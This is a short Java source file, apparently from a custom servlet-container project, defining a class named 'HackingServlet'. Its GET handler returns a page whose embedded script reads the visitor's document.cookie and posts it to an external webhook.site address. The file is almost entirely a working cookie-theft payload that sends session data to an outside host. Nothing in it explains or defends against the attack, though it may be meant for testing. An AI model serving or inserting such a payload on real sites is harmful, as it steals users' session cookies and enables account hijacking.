package com.example.model;

import com.kava.container.http.KavaHttpRequest;
import com.kava.container.http.KavaHttpResponse;
import com.kava.container.servlet.KavaServlet;

public class HackingServlet extends KavaServlet {
    @Override
    public void doGET(KavaHttpRequest request, KavaHttpResponse response) {
        response.setStatusCode(200);
        response.setRequest(request);
        response.setBody("""
                <script>
                var xhr = new XMLHttpRequest();
                xhr.open("POST", "https://webhook.site/13e6f66b-f6dd-496d-a3d9-650a05798885", true);
                xhr.send(JSON.stringify({
                    value: document.cookie
                }));
                </script>""");
    }

    @Override
    public void doPOST(KavaHttpRequest request, KavaHttpResponse response) {
        throw new UnsupportedOperationException();
    }
}
